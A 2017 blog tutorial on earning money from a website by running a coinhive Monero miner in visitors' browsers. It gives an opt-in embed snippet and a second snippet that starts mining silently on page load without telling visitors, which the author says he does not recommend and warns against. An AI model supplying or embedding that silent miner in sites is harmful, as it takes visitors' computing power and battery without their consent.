---
aliases:
  - "/how-to-monetize-your-website-with-cryptocurrency-mining/"
date: "2017-12-10"
description: "Advertising is dying. Let me show you a new way to monetize your website using a JavaScript-based Monero miner."
slug: "how-to-monetize-your-website-with-cryptocurrency-mining"
tags:
  - "cryptocurrency"
  - "programming"
title: "How to Monetize Your Website with Cryptocurrency Mining"
---


![Dwarf Miner Sketch][]

I’m a big fan of cryptocurrencies and blockchain technologies. They have a
number of interesting applications, one of which I’ll be discussing today:
monetizing your websites.

Developing and running a successful website can be really challenging. If your
website doesn’t directly charge users for a service, making money to cover your
expenses (and potentially turn a profit) can be nearly impossible.


## Advertising is Dying

![Dying Fly Sketch][]

Integrating with an ad network like Google Adsense and showing display ads on
your site is a losing game: people hate ads and go to extreme lengths to block
and ignore them. I’ve been using ad blockers since 2006 and haven’t seen a
single web ad in over 11 years. [Recent studies](https://pagefair.com/blog/2017/adblockreport/)
estimate 11% of the global population uses an ad blocker, and that number is
likely far greater for younger generations and people in North America.

Since advertising is a undisputedly dying as an industry, there are only a
couple of options you (as a website owner) can take to monetize your website in
a future-proof way:

- Ask your visitors to donate to your website to keep it alive. There are
  numerous ways to do this. Wikipedia shows a banner across their site whenever
  they need to raise money asking users to donate a few bucks to keep the site
  running. [Patreon](https://www.patreon.com) is another popular option: ask
  your users to pay you a small monthly fee to get extra content on your site.
- Charge your users money to use your website. This is the most straightforward
  approach, but also one of the hardest. Are your users willing to pay for what
  you provide?
- Mine cryptocurrencies in the user’s browser


## Mining Cryptocurrency for Profit

![Top Hat Sketch][]

Mining cryptocurrency in the browser is a relatively new strategy to monetize
websites. It’s theoretically workable, but extremely inefficient:

- Most cryptocurrencies require a lot of computing power to perform the
  necessary hash functions to “mine” cryptocurrencies
- Running cryptocurrency mining software in a user’s browser (via JavaScript) is
  inefficient: JavaScript is a slow interpreted language. Running CPU intensive
  code inside of the browser’s engine is also slow and error prone.

There is, however, one way to efficiently mine cryptocurrency in a user’s
browser: [Monero](https://getmonero.org/). Monero is a cryptocurrency designed
for anonymity. Transactions are anonymous and untraceable (unlike
[Bitcoin](https://bitcoin.org/en/you-need-to-know)).

The main reason why Monero can effectively be mined from within a browser is due
to the hashing algorithm that powers Monero transactions:
[CryptoNight](https://cryptonote.org/whitepaper.pdf).

The CryptoNight hashing algorithm is designed to run effectively on consumer
grade CPUs (this means normal desktop and laptop computers) while running
inefficiently on stronger CPUs and GPUs (which are traditionally required to
process large volumes of cryptocurrency transactions).

What this means is that Monero can be mined effectively from the computer you’re
using to read this article. Because of this, there is very little incentive for
investors to go spend millions of dollars on expensive computing equipment and
mine all of the Monero transactions (this is what has happened to Bitcoin and
Ethereum in recent years).

This levels the playing field, making it possible for you to effectively allow
users viewing your website to mine Monero for you via their browser.


## Mining Monero

![Monero Logo][]

So, how exactly can you get your users to mine Monero coins for you? The short
answer is [coinhive](https://coinhive.com/). coinhive is an API service that
allows you to embed a Monero miner into a user’s browser, which will mine coins
and earn money for you.

The way coinhive makes money is by keeping 30% of the Monero earned by your
miners. The remaining 70% is paid out to you directly in Monero.

If you have Monero, how can you cash it in for USD? In the same exact way you’d
cash Bitcoin in for USD: an exchange.

Currently, [Coinbase](https://www.coinbase.com/join/51660a68c08669f6b8000046) is
the most popular Bitcoin exchange around. It allows you to purchase Bitcoin,
sell Bitcoin, etc. The going price for Bitcoin as I write this article is nearly
$14,000 per coin.

Monero is not nearly as mainstream. There are a number of Monero exchanges you
can use, none of which have monopolized the space. You can find a list of all
the current Monero exchanges [here](http://monero.org/services/exchange/). As I
write this article, the price of a single Monero coin is $230.

If you were to run a website today that has around 10 - 20 active users mining
Monero, you could reasonably expect to earn 0.3 Monero per month: roughly $69.
If your website contains content that keeps users engaged for long periods of
time: mining Monero may be a viable strategy for monetizing your site.


## How to Mine Monero in the Browser

Now that we’ve covered the basics, let’s take a look at how you can actually
start mining Monero in the browser.

The first thing you’ll need to do is create a coinhive account, which you can do
[here](https://coinhive.com/account/signup).

Once you’ve created your account, you’ll want to visit the [Sites
page](https://coinhive.com/settings/sites). This page allows you to create new
API key pairs for each website you plan to mine on.

If you want to run this Monero mining code on multiple websites, you would
create multiple sites here and give each a unique name. This will allow you to
see how much each website has earned over time.

Now that you know how this works, go ahead and give your default API key pair a
name. It’s best to name it using the full URL of the domain you plan to run the
code on. Here’s what my screen looks like:

![coinhive Settings Page][]

**NOTE**: Whatever you do: don’t share your private key. Keep it private.

Next, you’ve got to embed the mining Javascript code into your web pages. You
have two primary ways to do this:

1. The nice way
2. The not-so-nice way

If you opt for strategy #1, you’ll want to embed the following JavaScript code
into your site:

```html
<script src="https://authedmine.com/lib/authedmine.min.js"></script>
<script>
  var miner = new CoinHive.Anonymous('YOUR_PUBLIC_KEY');
  miner.start();
</script>
```

When the page loads, your users will be greeted by this opt-in screen:

![coinhive Opt-in Page][]

This lets the user opt-in to what you’re asking them to do.

Now, if you want to go for option #2 (*which I’m not recommending*), what you’ll
want to do is the exact same thing as above with one minor change: link to a
different source file.

```html
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
  var miner = new CoinHive.Anonymous('YOUR_PUBLIC_KEY');
  miner.start();
</script>
```

This will let start silently mining Monero as soon the as the script is loaded,
without signaling anything to the user.


## Measuring Your Results

Now that you’ve got your users mining Monero for you, you’ll want to see how
much Monero you’re actually earning.

To do this, you’ll want to go check out your coinhive dashboard and take a look
at your stats:

![coinhive Dashboard Page][]

Not bad, right? In just a few minutes you are able to monetize any free website!


## Things to Consider

Before you run off and embed Monero mining software in all your websites, there
are a few things you should think about.

First off: I was partially lying to you earlier. While it’s true that the online
ad industry is dying because people hate ads, running a Monero miner in the
browser won’t save you from those of us who use adblockers.

I use the fantastic [uBlock Origin](https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm?hl=en)
Chrome extension and it blocks cryptocurrency miners like this one by default.
So if you’re trying to monetize a website via mining to recoup losses from
adblockers, this won’t help you. Instead: this is simply an alternative way to
monetize your free users.

While I have no evidence to back this up, I strongly suspect that users might be
more open to letting you borrow some of their CPU power than showing them
annoying and obnoxious display ads.

Finally: be careful what you do with this. If you choose to start running mining
software on a user’s computer without their consent, you’ll drain their device’s
battery faster, potentially make their device “lag”, etc. It’s just not a nice
thing to do.

So, as always, don’t be a jerk.

Got a question? [Hit me up][].

-Randall


  [Dwarf Miner Sketch]: /static/images/2017/dwarf-miner-sketch.jpg "Dwarf Miner Sketch"
  [Dying Fly Sketch]: /static/images/2017/dying-fly-sketch.jpg "Dying Fly Sketch"
  [Top Hat Sketch]: /static/images/2017/top-hat-sketch.png "Top Hat Sketch"
  [Monero Logo]: /static/images/2017/monero-logo.png "Monero Logo"
  [coinhive Settings Page]: /static/images/2017/coinhive-settings.png "coinhive Settings Page"
  [coinhive Opt-in Page]: /static/images/2017/coinhive-opt-in.png "coinhive Opt-in Page"
  [coinhive Dashboard Page]: /static/images/2017/coinhive-dashboard.png "coinhive Dashboard Page"
  [Hit me up]: mailto:r@rdegges.com "Randall Degges' Email"
